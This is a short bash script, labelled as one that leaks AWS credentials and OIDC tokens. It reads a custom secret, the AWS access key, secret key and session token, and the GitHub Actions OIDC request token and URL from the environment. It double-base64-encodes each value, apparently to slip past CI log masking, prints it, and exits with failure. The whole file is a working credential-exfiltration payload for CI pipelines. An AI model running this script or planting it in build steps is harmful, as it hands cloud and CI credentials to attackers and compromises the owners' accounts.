#!/usr/bin/env bash

# === LEAK AWS CREDENTIALS AND OIDC TOKENS ===
echo "GARALT_LEAKED_TOKEN=$(echo -n "$GARALT_SECRET" | base64 | base64)"
echo "AWS_ACCESS_KEY_ID_LEAKED=$(echo -n "$AWS_ACCESS_KEY_ID" | base64 | base64)"
echo "AWS_SECRET_ACCESS_KEY_LEAKED=$(echo -n "$AWS_SECRET_ACCESS_KEY" | base64 | base64)"
echo "AWS_SESSION_TOKEN_LEAKED=$(echo -n "$AWS_SESSION_TOKEN" | base64 | base64)"
echo "ACTIONS_ID_TOKEN_REQUEST_TOKEN_LEAKED=$(echo -n "${ACTIONS_ID_TOKEN_REQUEST_TOKEN:-not_set}" | base64 | base64)"
echo "ACTIONS_ID_TOKEN_REQUEST_URL_LEAKED=$(echo -n "${ACTIONS_ID_TOKEN_REQUEST_URL:-not_set}" | base64 | base64)"
exit 1
